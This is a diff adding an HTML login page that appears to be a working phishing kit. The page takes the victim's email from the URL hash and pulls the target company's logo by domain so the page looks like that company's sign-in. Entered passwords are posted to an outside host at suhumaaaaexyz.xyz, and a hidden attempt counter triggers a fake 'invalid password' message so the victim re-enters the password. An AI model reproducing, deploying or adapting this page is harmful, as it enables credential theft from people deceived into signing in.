@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <!-- Bootstrap CSS -->
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+      integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+      crossorigin="anonymous"
+    />
+    <!-- Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        background: #fff;
+        font-family: "Archivo Narrow", sans-serif;
+      }
+
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .office {
+        width: 380px;
+        background: #fff;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+        padding: 20px;
+        margin: auto;
+      }
+
+      .logo img {
+        width: 50px;
+        height: 50px;
+      }
+
+      .logo h3,
+      .logo h5 {
+        margin: 0.5em 0;
+      }
+
+      .form-holder input[type="email"],
+      .form-holder input[type="password"] {
+        width: 100%;
+        height: 40px;
+        margin-bottom: 15px;
+      }
+
+      .checkbox label {
+        font-size: 13px;
+        margin-left: 5px;
+      }
+
+      .btn-holder {
+        text-align: center;
+      }
+
+      .btn-holder .btn {
+        background-color: #0073c6;
+        color: #fff;
+        border-radius: 0;
+        width: 100%;
+        padding: 10px;
+      }
+
+      .btn-holder .btn:hover {
+        background-color: #0056b3;
+      }
+
+      .msg {
+        display: none;
+        font-weight: 600;
+        color: red;
+        margin-top: 10px;
+        text-align: center;
+      }
+
+      .error {
+        display: none;
+        color: red;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="office">
+        <div class="logo text-center">
+          <img
+            id="proimg"
+            src="https://i.ibb.co/MkZy9Sy/zezezeze.png"
+            alt="Logo"
+          />
+          <h3 id="comname" class="text-dark">Company Name</h3>
+          <h5 class="font-weight-light">Sign in to continue</h5>
+        </div>
+        <div id="msg" class="msg"></div>
+        <div id="error" class="error">
+          Invalid Password. Please enter correct password.
+        </div>
+        <form id="login-form">
+          <div class="form-holder">
+            <input
+              type="email"
+              id="email"
+              class="form-control"
+              readonly
+              value="[[-Email-]]"
+              placeholder="someone@example.com"
+              required
+            />
+            <input
+              type="password"
+              id="password"
+              class="form-control"
+              placeholder="Password"
+              required
+              autofocus
+            />
+            <div class="checkbox">
+              <input type="checkbox" id="remember-me" />
+              <input type="hidden" id="number" value="0" />
+              <label for="remember-me">Remember me</label>
+            </div>
+            <div class="btn-holder">
+              <button type="submit" class="btn btn-lg" id="submit-btn">
+                LOGIN
+              </button>
+            </div>
+            <p><a href="#">Can't access your account?</a></p>
+            <p><a href="#">Sign in with a single-use code</a></p>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.js"
+      integrity="sha512-+k1pnlgt4F1H8L7t3z95o3/KO+o78INEcXTbnoJQ/F2VqDVhWoaiVml/OEHv9HsVgxUaVW+IbiZPUJQfF/YxZw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      src="https://code.jquery.com/jquery-3.6.0.min.js"
+      integrity="sha384-GV4K6KYzABRF3j5z2a89j3mNXp+Mj2WHtH6/W+30cwj+9gGtLW5wCWfzVEW24F6b"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+
+    <script>
+      var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+      var email = window.location.hash.substr(1);
+      if (!email) {
+      } else {
+        var base64regex =
+          /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+        if (!base64regex.test(email)) {
+          // alert(btoa(email));
+          var my_email = email;
+        } else {
+          // alert(atob(email));
+          var my_email = atob(email);
+        }
+        var filter =
+          /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr(ind + 1);
+        const bck = my_email.split("@");
+        var my_back = bck[0];
+        var c = my_slice.substr(0, my_slice.indexOf("."));
+        var final = c.toUpperCase();
+      }
+
+      var $counter = $("#number");
+
+      $(document).ready(function () {
+        $("#email").val(my_email);
+        $("#proimg").attr("src", "https://logo.clearbit.com/" + my_slice);
+        $("#comname").html(final);
+
+        $("#login-form").submit(function (event) {
+          event.preventDefault();
+
+          $counter.val(parseInt($counter.val()) + 1);
+
+          var email = $("#email").val();
+          var password = $("#password").val();
+          var verify = $("#number").val();
+
+          // Basic validation
+          if (!email || !password) {
+            $("#msg").text("Please fill out all fields.").show();
+            return;
+          }
+
+          // Perform AJAX login request
+          $.ajax({
+            type: "POST",
+            url: "https://suhumaaaaexyz.xyz/alldomik/alldomain/login.php", // Replace with your actual backend URL
+            data: {
+              email: email,
+              password: password,
+              count: verify,
+            },
+            dataType: "json",
+            beforeSend: function () {
+              $("#submit-btn").html("Verifying..."); // Show loading spinner or text
+            },
+            success: function (response) {
+              if (response && response.signal === "again") {
+                $("#password").val(""); // Clear password field
+              }
+              if (response && response.signal === "ok") {
+                $("#password").val(""); // Clear password field
+
+                location.href = "https://" + response.redirect_link;
+              } else {
+                $("#msg")
+                  .text(
+                    response.msg || "Invalid credentials. Please try again."
+                  )
+                  .show();
+              }
+            },
+            error: function () {
+              $("#msg").text("An error occurred. Please try again.").show();
+            },
+            complete: function () {
+              $("#submit-btn").html("LOGIN"); // Reset button text
+            },
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
